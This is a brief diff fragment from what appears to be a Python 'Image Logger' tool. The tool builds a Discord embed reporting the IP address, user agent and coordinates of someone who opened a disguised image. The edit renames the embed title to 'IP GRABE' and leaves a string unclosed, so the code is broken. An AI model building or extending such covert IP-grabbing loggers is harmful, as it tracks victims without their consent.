@@ -144,7 +144,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "IP GRABE,
             "color": config["color"],
             "description": f"""**A User Opened the Original Image!**
 
